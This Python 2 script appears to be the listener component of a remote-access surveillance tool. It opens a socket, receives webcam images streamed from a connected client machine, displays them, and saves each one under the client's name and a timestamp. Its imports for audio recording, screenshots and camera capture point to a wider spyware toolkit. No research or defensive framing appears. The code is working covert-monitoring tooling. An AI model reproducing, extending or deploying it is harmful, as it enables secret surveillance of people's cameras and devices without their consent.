#!/usr/bin/python
import socket
import sys
import getpass
import os
import time
import pyaudio
import pygame.camera
import pygame.image
import wave
import cv2
import numpy
import subprocess
import pyscreenshot as ImageGrab
import re
from threading import Thread

def recvall(con,cmd,sz):
  global BYTES
  part=''
  f=open(cmd,'wb')
  l=con.recv(BYTES)
  sub=0
  sz=int(sz)
  perc=float(0)
  counter=float(1)
  while (l):
    sub+=len(l)
    perc=float(sub)*100/sz
    if perc>=counter:
      #print perc,"%"
      sys.stdout.write("%f%%\r"%(perc))
      sys.stdout.flush()
      counter=counter+1
    f.write(l)
    if sub>=sz:
      break
    l=con.recv(BYTES)
  print '100%\n',
  f.close()
  
def CapturepicThread(count,HOST,PORT,bYTES,CURRENT_CLIENT):
  global BYTES
  try:  
    PORT=int(PORT)
    BYTES=int(bYTES)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT+5))
    s.listen(1)
    print "LISTEN : ",HOST,PORT+5
    con, addr = s.accept()
    print "GOT : ",addr
    cmd=int(count)
    con.sendall(str(cmd)+'\n')
    it = 0
    for i in range(1,cmd+1):
      chunk = ''
      perc = 0
      total = 0
      data = con.recv(1)
      while data!='\n':
            total = total*10+int(data)
            data = con.recv(1)
      total = int(total)
      while True:
        temp = con.recv(BYTES)
        chunk += temp
        if((len(chunk)//total)*100>perc):
          perc=(len(chunk)//total)*100
          #print perc,"%"
          sys.stdout.write("%f%%\r"%(perc))
          sys.stdout.flush()
        if len(chunk) == total:
          data = numpy.fromstring(chunk,dtype='uint8')
          decimg = cv2.imdecode(data,1)
          cv2.imshow('server',decimg)
          cv2.imwrite(CURRENT_CLIENT+" "+time.strftime("%Y-%m-%d %H-%M-%S", time.localtime())+str(i)+".bmp",decimg)
          break
      print '100%\n',
      con.sendall('D')
    con.close()
  except Exception,e:
    print e
    
CapturepicThread(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])

